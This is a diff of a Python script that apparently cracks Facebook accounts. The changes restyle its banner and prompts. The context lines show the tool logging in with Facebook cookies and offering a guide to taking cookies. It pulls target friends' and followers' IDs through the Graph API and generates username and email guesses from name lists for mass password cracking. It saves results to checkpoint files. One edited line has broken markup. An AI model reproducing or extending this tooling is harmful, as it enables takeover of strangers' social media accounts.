@@ -178,16 +178,16 @@ def back():
 #------------------[ LOGO-LAKNAT ]-----------------#
 def banner():
 	cetak(panel(f"""
-         [bold cyan]  ___ ___ ___ __  __ ___ _   _ __  __
-         [bold cyan] | _ \ _ \ __|  \/  |_ _| | | |  \/  |
-        [bold green]  |  _/   / _|| |\/| || || |_| | |\/| |
-        [bold green]  |_| |_|_\___|_|  |_|___|\___/|_|  |_|
+         [bold green]  ___ ___ ___ __  __ ___ _   _ __  __
+         [bold green] | _ \ _ \ __|  \/  |_ _| | | |  \/  |
+        [bold cyan]  |  _/   / _|| |\/| || || |_| | |\/| |
+        [bold cyan]  |_| |_|_\___|_|  |_|___|\___/|_|  |_|
              """,width=90,title=f"LOGO",style=f"bold white"))
 #--------------------[ BAGIAN-MASUK ]--------------#
 def login123():
 	os.system('clear')
 	banner()
-	cetak(panel(f"{P}[{H}01{P}] \33[1;96m Login Menggunakan Cookies [[bold green] ON [bold white]]\n{P}[{H}02{P}] \33[1;96m Doa Sebelum Crack [[bold green] ON [bold white]]\n{P}[{H}03{P}] \33[1;96m Cara Mengambil Cookies Facebook [[bold green] ON [bold white]]\n{P}[{H}04{P}] \33[1;96m Cek Hasil Crack [[bold green] ON [bold white]]",width=90,title=f"[bold green]Menu Login",padding=(0,2),style=f"bold white"))
+	cetak(panel(f"{P}[{H}01{P}][bold cyan] Login Menggunakan Cookies [[bold green] ON [bold white]]\n{P}[{H}02{P}][bold cyan] Doa Sebelum Crack [[bold green] ON [bold white]]\n{P}[{H}03{P}] [bold cyan]Cara Mengambil Cookies Facebook [[bold green] ON [bold white]]\n{P}[{H}04{P}] [bold cyan]Cek Hasil Crack [[bold green] ON [bold white]]",width=90,title=f"[bold green]Menu Login",padding=(0,2),style=f"bold white"))
 	cetak(panel(f'[bold cyan]Anda Wajib Login Menggunakan Cookies Untuk Unlock Semua Fitur Spesial Yang Ada Di Script Ini [bold green]By XyzonXD',width=90,title=f"[bold green]Informasi",style=f"bold white"))
 	vevek = input(f' {P}[{H}+{P}]\33[1;96m Pilih Menu : {P}')
 	if vevek in ['1','01']:
@@ -885,7 +885,7 @@ def pengikut():
 		exit()
 	ses = requests.Session()
 	cetak(panel(f"[bold cyan]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri",width=90,padding=(0,7),style=f"bold white"))
-	akun = console.input(f' [bold white][[bold cyan]+[bold white]] [bold cyan]Masukan Id Target : [P]')
+	akun = console.input(f' [bold white][[bold green]+[bold white]] [bold cyan]Masukan Id Target : ')
 	try:
 		koh2 = ses.get(f'https://graph.facebook.com/{akun}?fields=subscribers.limit(5000)&access_token={token}',cookies={'cookie': cok}).json()
 		for pi in koh2['subscribers']['data']:
@@ -910,7 +910,7 @@ def crack_nama():
 	custom = [" iqbal"," kami"," siska"," batam"," medan"," new"," old"," jian"," store"," tias"," rio"," lia"," farz"," marvel"," jakarta"," anisha"," juven"," der"," rika"," udin"," rayan"," tina"," tiara"," fahmi"," baili"," rima"," gadis"," dimas"," abram"," ajis"," vicky"," charlie"," piko"," billa"]
 	custom2 = ["galang ","gilang ","gita ","steven ","aulia ","tiyas ","albert ","naura ","naira ","mancung ","dewi ","josen ","johan ","slot ","sharil ","hendrik ","edo ","ridho ","anton ","reval ","abi ","yehezkiel ","hafiz ","daniel ","angun "]
 	cetak(panel(f"    {O}Crack Username Satu Nama Yang Ingin Di Crack Setara Dengan 5.000 Username",width=90,padding=(0,2),style=f"bold white"))
-	nam = console.input(f' {P}[{H}+{P}] \33[1;96mMasukan Nama : {P}').split(",")
+	nam = console.input(f' [bold white][[bold green]+[bold white]] [bold cyan]Masukan Nama : ').split(",")
 	for ser in nam:		
 		for belakang in custom:
 			id = ser+belakang
@@ -949,18 +949,18 @@ def crack_email():
 	xc = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
 	blk = ['99','official','gaming','utama','123','1234','12345','123456','cakep']
 	global ok , cp
-	cetak(nel(f'\33[1;96mMasukan Nama Email Yang Ingin Di Crack, Contoh : Andi, Dian, Putri, Aditya',width=90,padding=(0,5),style=f"bold white"))
-	nama = console.input(f' {P}[{H}+{P}]\33[1;96m Masukan Nama Target : {P}')
+	cetak(nel(f'[bold cyan]Masukan Nama Email Yang Ingin Di Crack, Contoh : Andi, Dian, Putri, Aditya',width=90,padding=(0,5),style=f"bold white"))
+	nama = console.input(f' [bold white][[bold green]+[bold white]] [bold cyan] Masukan Nama Target : ')
 	if ',' in str(nama):
 		print(f" {P}[{H}+{P}] \33[1;91mMasukan Nama, Jangan Kosong Ngab")
 		time.sleep(3);exit()
-	cetak(nel(f'\33[1;96mMasukan Nama Domain , Contoh : @Gmail.com, @Yahoo.com, Dll',width=90,padding=(0,9),style=f"bold white"))
-	doma = console.input(f' {P}[{H}+{P}]\33[1;96m Masukan Nama Domain : {P}')
+	cetak(nel(f'[bold cyan]Masukan Nama Domain , Contoh : @Gmail.com, @Yahoo.com, Dll',width=90,padding=(0,9),style=f"bold white"))
+	doma = console.input(f' [bold white][[bold green]+[bold white]] [bold cyan] Masukan Nama Domain : ')
 	if '@' not in str(doma) or '.com' not in str(doma):
 		print(f" {P}[{H}+{P}]\33[1;91m Masukan Domain Dengan Benar")
 		time.sleep(3);exit()
-	cetak(nel(f'\33[1;96mMax 5000 Idz , Dan Hanya Bisa Menggunakan Metode Reguler Dan Async',width=90,padding=(0,5),style=f"bold white"))
-	jumlah = console.input(f' {P}[{H}+{P}]\33[1;96m Total Dump : ')
+	cetak(nel(f'[bold cyan]Max 5000 Idz , Dan Hanya Bisa Menggunakan Metode Reguler Dan Async',width=90,padding=(0,5),style=f"bold white"))
+	jumlah = console.input(f' [bold white][[bold green]+[bold white]] [bold cyan] Total Dump : ')
 	for xyz in range(int(jumlah)):
 		A = nama
 		B = [f'{str(rc(xc))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(xc))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(xc))}{str(rc(blk))}']
@@ -976,7 +976,7 @@ def crack_email():
 		
 #-----------------[ CRACK GRUP ]-----------------# 
 def crack_group():
-	cetak(nel('{O} Masukan Idz Grup Pastikan Grup Bersifat Publik Bukan Private',width=90,padding=(0,8),style=f"bold white"))
+	cetak(nel('[bold cyan Masukan Idz Grup Pastikan Grup Bersifat Publik Bukan Private',width=90,padding=(0,8),style=f"bold white"))
 	link = input(f' {P}[{H}+{P}]\33[1;96m Id Group : {P}')
 	url = "https://mbasic.facebook.com/groups/"+link
 	try:dump_grup(url)
@@ -1035,7 +1035,7 @@ def result():
 			geeh = input(f'\n{P}{x}{H} [+] {x}{P}{x} {P}Select{x} : ')
 			try:geh = lol[geeh]
 			except KeyError:
-				print(' {P}[{H}+{P}]\33[1;91m  Pilih Yang Bener Kontol ')
+				print(' \33[1;91m Pilih Yang Bener Kontol ')
 				exit()
 			try:lin = open('CP/'+geh,'r').read().splitlines()
 			except:
@@ -1725,7 +1725,7 @@ def opsi():
 	CP = ("CP/")
 	romi = input("%s%s%s\33[1;96mNama file %s> %s"%(U,til,O,M,K))
 	if romi == "":
-		print(" {P}[{H}+{P}]\33[1;96m Isi Yang Benar "%(M,til));jeda(2)
+		print(" {P}[{H}+{P}] \33[1;96mIsi Yang Benar ");jeda(2)
 		back()
 	try:
 		file_cp = open(CP+romi, "r").readlines()
